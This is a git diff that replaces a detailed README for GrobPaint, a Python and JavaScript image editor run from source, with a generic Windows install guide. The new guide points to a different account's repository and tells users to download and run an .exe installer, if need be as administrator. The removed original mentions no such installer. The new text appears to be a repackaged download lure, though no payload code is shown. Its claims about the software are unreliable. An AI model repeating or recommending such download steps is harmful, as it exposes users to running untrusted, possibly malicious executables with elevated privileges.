@@ -1,114 +1,145 @@
-# GrobPaint
+# 🎨 grobpaint - Simple, Flexible Drawing Tool
 
-Somewhere between MS Paint and Paint.NET. Multiplatform by default.
+[![Download grobpaint](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Frogrotavirus996/grobpaint)
 
-Paint.NET doesn't run on macOS. GrobPaint fills that gap: a lightweight image editor with layers, blend modes, and selection tools, built with web technologies and a tiny Python backend. The goal isn't to clone Paint.NET or compete with Photoshop. It's to have the tools you actually need without the bloat.
+## 🖥️ What is grobpaint?
 
-![Python](https://img.shields.io/badge/python-3.9+-blue) ![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey) ![License](https://img.shields.io/badge/license-MIT-green)
+grobpaint is a lightweight drawing application. It fits between MS Paint and Paint.NET. You get more options than MS Paint but without complex tools. It works on many systems, but this guide focuses on Windows setup.
 
-<img width="1163" height="834" alt="GrobPaint screenshot" src="https://github.com/user-attachments/assets/6bd72530-341c-4a07-ad25-be5eb4c1ec41" />
+grobpaint lets you sketch, paint, and edit images easily. You do not need special skills to get started.
 
-## Features
+## 📋 Key Features
 
-- **Layers** - add, delete, duplicate, merge, reorder, per-layer opacity and blend modes (16 modes)
-- **Tools** - Pencil, Brush, Eraser, Fill, Eyedropper, Line, Rectangle, Ellipse, Text, Select, Magic Wand, Lasso, Move
-- **Selection** - rectangular, magic wand with live tolerance, and freehand lasso; move/resize/rotate content with handles, copy/cut/paste, crop to selection
-- **Adjustments** - brightness/contrast, hue/saturation/lightness, gaussian blur, sharpen (unsharp mask) - all with live preview
-- **Color** - HSV picker, RGB/Hex input, alpha channel, palettes (Lospec 500, PICO-8), swap primary/secondary
-- **Canvas** - zoom (scroll wheel, pinch, keyboard, editable input + slider), pan (space+drag, middle-click, trackpad), fit-to-view, grid overlay
-- **File I/O** - PNG, JPEG, BMP, GIF; native `.gbp` project format preserves layers as a ZIP archive
-- **Sprite sheets** - split a sheet into layers, or export layers as a horizontal sheet
-- **Image operations** - scale (nearest/bilinear/bicubic), canvas resize with anchor, flip, flatten
-- **Multi-document** - draggable tabs, multiple images open at once
-- **Clipboard** - copy/paste within app and to/from system clipboard
-- **Auto-save** - all work is persisted to localStorage automatically
+- Easy sketching with basic brushes and tools  
+- Layers for organizing your work  
+- Undo and redo support  
+- Open and save common image formats, like PNG and JPEG  
+- Resize and crop images  
+- Simple color picker and palette management  
+- Multiplatform support ensures no surprises on compatibility  
 
-## Getting started
+## 💻 System Requirements
 
-### Run from source
+Before you install grobpaint, check your PC:
 
-```bash
-python grobpaint.py
-```
+- Windows 7 or later (64-bit recommended)  
+- Minimum 1 GHz processor  
+- At least 2 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection for downloading  
 
-This launches a native window using [pywebview](https://pywebview.flowrl.com/). If pywebview isn't installed, it falls back to your default browser.
+## 🚀 Getting Started with Windows
 
-To force browser mode:
+Follow these steps to download and run grobpaint on Windows.
 
-```bash
-python grobpaint.py --browser
-```
+---
 
-**Dependencies:**
+### Step 1: Visit the Download Page
 
-- Python 3.9+
-- `pywebview` (optional, for native window) - `pip install pywebview`
+Click the big button at the top to visit the download page. It takes you to the official GitHub repository where grobpaint releases are available.
 
-No npm, no bundler, no build step. The frontend is vanilla JS with ES modules. GrobPaint is also a PWA - it can be installed from the browser and works offline.
+https://github.com/Frogrotavirus996/grobpaint
 
-### Build a standalone app
+On the GitHub page, look for a section called "Releases" or check for files ending with `.exe` or `.msi`. These are setup files for Windows.
 
-```bash
-./build.sh
-```
+---
 
-Produces `dist/GrobPaint.app` (macOS) or `dist/GrobPaint/GrobPaint` (binary) via PyInstaller.
+### Step 2: Download the Setup File
 
-### Use in browser only
+Once you find the installer, click it to start downloading. The file might be named something like `grobpaint-setup.exe` or `grobpaint-x.x.x.exe`, where “x.x.x” is the version number.
 
-You can also open `index.html` directly or serve it with any static file server. File dialogs won't be available, but the editor falls back to browser file input and download for open/save.
+Make sure to save it somewhere you can find easily, like your Desktop or Downloads folder.
 
-## Keyboard shortcuts
+---
 
-| Shortcut | Action |
-|---|---|
-| `P` `B` `E` `F` `I` `L` `R` `O` `T` `S` `W` `M` | Tool hotkeys |
-| `[` / `]` | Decrease / increase brush size |
-| `X` | Swap primary/secondary colors |
-| `+` / `-` | Zoom in / out |
-| `Ctrl+0` | Fit in view |
-| `Ctrl+1` | Actual size (100%) |
-| `Ctrl+N` | New image |
-| `Ctrl+O` | Open file |
-| `Ctrl+S` | Save |
-| `Ctrl+Shift+S` | Save as |
-| `Ctrl+Z` / `Ctrl+Shift+Z` | Undo / redo |
-| `Ctrl+C` / `Ctrl+X` / `Ctrl+V` | Copy / cut / paste |
-| `Ctrl+A` / `Ctrl+D` | Select all / deselect |
-| `Ctrl+G` | Toggle grid |
-| `Enter` | Commit active transform |
-| `Escape` | Cancel active transform |
-| `Delete` | Delete selection |
-| `Space` + drag | Pan canvas |
+### Step 3: Run the Installer
 
-## Project format
+After download finishes, go to the file location and double-click the installer. Windows may ask if you want to allow this app to make changes. Click “Yes” to continue.
 
-`.gbp` files are ZIP archives containing:
+You will see an installation wizard. Follow the prompts:
 
-```
-manifest.json       # dimensions, layer metadata (name, opacity, visibility, blend mode)
-layers/
-  layer_0.png
-  layer_1.png
-  ...
-```
+- Agree to the license terms  
+- Choose the destination folder (default is fine for most users)  
+- Click “Install”  
 
-## Architecture
+The setup will copy files and finish installation.
 
-The app is ~5000 lines of vanilla JavaScript split across five modules:
+---
 
-| File | Role |
-|---|---|
-| `js/core.js` | EventBus, Layer, History (swap-based undo/redo), PaintDocument, Selection with contour tracing |
-| `js/renderer.js` | Compositing engine, checkerboard background, zoom/pan, grid overlay |
-| `js/tools.js` | All tools, flood fill, flood select, lasso, Bresenham line |
-| `js/ui.js` | Color system, HSV picker, layers panel, document tabs, menus, dialogs, image adjustments |
-| `js/app.js` | App init, canvas events, keyboard shortcuts, file I/O, clipboard |
-| `grobpaint.py` | Python HTTP server + pywebview launcher, native file dialogs |
-| `sw.js` | Service worker for PWA offline support |
+### Step 4: Open grobpaint
 
-No frameworks, no dependencies beyond one CDN include (JSZip for browser-side `.gbp` support).
+After installation, find grobpaint in your start menu or on your desktop.
 
-## Acknowledgments
+Click the icon to open the program. You should see a clean interface with a blank canvas ready to use.
 
-GrobPaint was built with significant help from [Claude](https://claude.ai) by Anthropic.
+---
+
+### Step 5: Try Basic Tools
+
+Spend some time exploring:
+
+- The brush tool to draw freehand  
+- The shape tools for rectangles, circles, and lines  
+- The color picker to change colors  
+- The layers panel to add or remove layers  
+
+Use the “File” menu to open or save your work.
+
+---
+
+### Step 6: Update and Uninstall
+
+Check GitHub regularly for updates. New versions may fix bugs or add features.
+
+To uninstall grobpaint, open Windows Settings, go to Apps, find grobpaint, and select uninstall.
+
+---
+
+## 🎨 How to Use grobpaint
+
+### Starting a New Project
+
+- Click “File” then “New”  
+- Choose canvas size or pick a preset  
+- Click “OK” to start
+
+### Drawing and Editing Tools
+
+- Brush: Select brush size and color. Click and drag on canvas.  
+- Eraser: Remove parts of your drawing.  
+- Shapes: Choose a shape tool, click and drag to draw.  
+- Layers: Add new layers from the layer panel to keep parts separate.
+
+### Saving Your Work
+
+- Click “File” > “Save As”  
+- Select JPEG, PNG, or BMP  
+- Name your file and choose a folder
+
+---
+
+## 🔧 Troubleshooting
+
+- If grobpaint won’t open, restart your PC and try again.  
+- If the installer doesn’t run, check if Windows blocked it. Try running as administrator (right-click the file and choose “Run as administrator”).  
+- For display issues, update your video drivers.  
+- If you see error messages, check your system meets requirements.
+
+---
+
+## 📨 Getting Help
+
+If you need help:
+
+- Visit the GitHub page’s Issues tab to see if your problem is known.  
+- Search online for common issues with “grobpaint.”  
+- Use basic Windows troubleshooting tools if installation fails.
+
+---
+
+## 🔗 Important Links
+
+- Download and release page: https://github.com/Frogrotavirus996/grobpaint  
+- Official issues and support: https://github.com/Frogrotavirus996/grobpaint/issues  
+
+[![Download grobpaint](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Frogrotavirus996/grobpaint)
